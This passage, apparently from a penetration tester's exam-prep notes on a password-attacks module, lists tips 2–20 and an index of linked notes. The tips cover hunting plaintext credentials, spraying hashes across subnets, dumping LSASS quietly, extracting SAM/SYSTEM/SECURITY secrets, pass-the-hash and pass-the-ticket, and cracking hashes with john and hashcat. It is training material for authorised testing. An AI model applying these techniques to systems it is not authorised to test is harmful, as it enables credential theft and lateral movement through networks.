2. **Hunt files BEFORE dumping LSASS.** Plaintext in `bash_history`/`cmdkey`/`unattend.xml`/SYSVOL doesn't trip AV and often outranks your current user. LSASS is loud and PPL-blocked.
3. **Spray EVERY new hash/cred across EVERY known host before escalating.** The Credential Theft Shuffle: most "stuck" moments = a cred you already own works on a host you didn't retry. `nxc --local-auth -H` across the /24.
4. **`aad3b435b51404eeaad3b435b51404ee` is the empty LM hash** — never a target. Only NT (field 4 of `user:rid:lm:nt:::`) matters.
5. **Pull the lockout policy before any AD spray.** `net accounts /domain` / `--pass-pol` / `rpcclient getdompwinfo`. One password per observation window. Kerbrute *userenum* is lockout-free; *passwordspray* is NOT.
6. **LSASS is PPL + maybe Credential Guard on modern Windows.** Plain `OpenProcess` fails. Task Manager dump is stealthier than `comsvcs`. WDigest cleartext only on legacy/forced — expect NT hashes only.
7. **All three hives or none.** `secretsdump` needs SAM+SYSTEM minimum; SECURITY adds DCC2 + LSA secrets (often service-account passwords **in cleartext** — no cracking needed).
8. **`ssh-keygen -yf id_rsa` before `ssh2john`.** No prompt = unencrypted key, use it directly. Modern OpenSSH headers look identical encrypted or not — never eyeball.
9. **`bitlocker2john -i` (the `-i` is mandatory).** Target `$bitlocker$0`/`$1` (password); `$2`/`$3` are 48-digit recovery keys — uncrackable, wasted effort.
10. **`kinit`/PKINIT principals are case-sensitive:** lowercase user, **UPPERCASE realm**. And every Kerberos tool needs `/etc/krb5.conf` + `/etc/hosts` FQDN, and the **FQDN not IP** with `-k`.
11. **RDP PtH needs `DisableRestrictedAdmin=0`** set on the target first (you need code-exec there). Only RID 500 PtH's by default unless `LocalAccountTokenFilterPolicy=1`; domain accounts are exempt.
12. **`runas /savecred` only works if `cmdkey /list` already shows the cred** — it cannot conjure one. But when present, it's a free pivot with zero cracking.
13. **LAPS rotates the local Administrator per host** — a dumped local-admin hash won't reuse elsewhere. Don't assume gold-image reuse blindly; test, and check if you can read `ms-Mcs-AdmPwd`.
14. **Snaffler/MANSPIDER Red hits are noisy by design.** Manually verify before reporting. Tools run as *their* user context — different users see different shares; re-run as each cred you get.
15. **`unshadow` then `john --single` on Linux shadow** — single-crack uses the GECOS field and is criminally underused; run it before wordlist mode on `/etc/shadow`.
16. **`cewl` + small OSINT base list + custom rules beats `rockyou -r best64`** for a *targeted* user. Escape `\$` inside `cat << EOF` rule heredocs or the shell eats it.
17. **DMZ/pivot hosts have no egress.** Upload tools through the existing SSH/RDP session (`/drive:linux,.` on xfreerdp, or `python3 -m http.server` + wget from inside) — the target can't pull from the internet.
18. **`john.pot` / `hashcat.potfile` cache cracked results.** `--show` re-displays without re-cracking; delete the pot file to force a fresh crack.
19. **Document creds as you go:** `proto://user:pass@host (source: where found)`. The exam grades the *chain* — a working box with no documented path scores poorly.
20. **`getnthash.py` converts a PtC primitive into a free PtH/PtT.** After PKINIT, don't stop at the ticket — pull the NT hash too; it widens every downstream option.

---

## Related Vault Notes

- `[[00-overview]]` — module summary + key command index
- `[[02-introduction-to-password-cracking]]` — hashing, salt, rainbow vs brute vs dictionary
- `[[03-introduction-to-john-the-ripper]]` — single/wordlist/incremental, `hashid`, `2john` family
- `[[04-introduction-to-hashcat]]` — attack modes, hash modes, masks, `best64.rule`
- `[[05-writing-custom-wordlists-and-rules]]` — OSINT lists, custom rules, CeWL
- `[[06-cracking-protected-files]]` — SSH keys, Office, PDF
- `[[07-cracking-protected-archives]]` — ZIP, OpenSSL-wrapped, BitLocker + dislocker
- `[[08-network-services]]` — WinRM/SSH/RDP/SMB online brute
- `[[09-spraying-stuffing-defaults]]` — spray vs stuffing vs default creds
- `[[10-windows-authentication-process]]` — LSASS/SAM/NTDS/DPAPI theory + attack map
- `[[11-attacking-sam-system-security]]` — reg save + secretsdump + nxc --sam/--lsa
- `[[12-attacking-lsass]]` — comsvcs/Task Mgr dump + pypykatz
- `[[13-attacking-windows-credential-manager]]` — cmdkey, runas /savecred, credman, LaZagne
- `[[14-attacking-active-directory-and-ntds]]` — username-anarchy, kerbrute, VSS/ntdsutil, DCSync
- `[[15-credential-hunting-in-windows]]` — findstr, SYSVOL, unattend, LaZagne
- `[[16-linux-authentication-process]]` — passwd/shadow, unshadow, hash IDs, opasswd
- `[[17-credential-hunting-in-linux]]` — history/cron/configs/mimipenguin/firefox_decrypt
- `[[18-credential-hunting-in-network-traffic]]` — Wireshark filters + Pcredz
- `[[19-credential-hunting-in-network-shares]]` — Snaffler/PowerHuntShares/MANSPIDER/nxc --spider
- `[[20-pass-the-hash]]` — PtH SMB/WinRM/RDP, UAC/RID500, LocalAccountTokenFilterPolicy
- `[[21-pass-the-ticket-from-windows]]` — Mimikatz/Rubeus export, OverPtH, ptt
- `[[22-pass-the-ticket-from-linux]]` — keytab/ccache, kinit, KRB5CCNAME, linikatz
- `[[23-pass-the-certificate]]` — ESC8 relay, Shadow Credentials, PKINIT, getnthash
- `[[24-password-policies]]` — NIST/CIS/PCI, blacklist, enforcement (report remediation)
- `[[25-password-managers]]` — zero-knowledge model, .kdbx/.psafe3 cracking, FIDO2
- `[[26-skills-assessment]]` — full Credential Theft Shuffle: SSH spray → ligolo → Snaffler → psafe3 → LSASS → PtH → NTDS

External cross-vault:
- AD chains: `[[../ad-enum-attacks/00-METHODOLOGY]]` (Kerberoast/AS-REP/ACL/DCSync; this module feeds it hashes & tickets)
- Pivoting (skills assessment needs it): `[[../pivoting-tunneling/00-METHODOLOGY]]`
- Online brute depth: `[[../login-brute-forcing/00-METHODOLOGY]]` (hydra/medusa, hybrid wordlists)
- Windows/Linux local escalation after a foothold: `[[../windows-privesc/00-METHODOLOGY]]`, `[[../linux-privallege-escalation/00-METHODOLOGY]]`
- Triage by symptom: `[[../ATTACK-PATHS]]` §7 (credential cracking) + §5 (AD by what you have)
- Index: `[[../SEARCH]]`
